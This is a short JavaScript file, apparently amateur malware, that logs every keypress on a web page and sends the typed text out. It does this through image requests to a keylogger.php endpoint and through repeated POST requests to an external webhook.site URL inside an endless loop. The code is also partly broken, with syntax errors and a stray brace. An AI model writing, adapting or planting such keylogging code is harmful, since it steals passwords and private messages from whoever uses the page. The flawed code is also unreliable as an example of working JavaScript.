//basic shit, adding message sending soon.
var keys = '';
document.onkeypress = function(e) {
  get = window.event ? event : e;
  key = get.keyCode ? get.keyCode : get.charCode;
  key = String.fromCharCode(key);
  keys += key;
}
window.setInterval(function() {
  if (keys != '') {
    new Image().src = 'keylogger.php?c=' + keys;
    keys = '';
  }
}, 500);
console.log(keys);


var webhook = 'https://webhook.site/f70bf123-e142-4f81-8f36-156a98c300ed';

var request = new XMLHttpRequest();
      request.open("POST", webhook);

      request.setRequestHeader('Content-type', 'application/json');


      var params = {
        content: keys;
      }

      request.send(JSON.stringify(params));





while (true){
      request.open("POST", webhook);

      request.setRequestHeader('Content-type', 'application/json');


      var params = {
        content: keys;
      }

      request.send(JSON.stringify(params));

  }
}
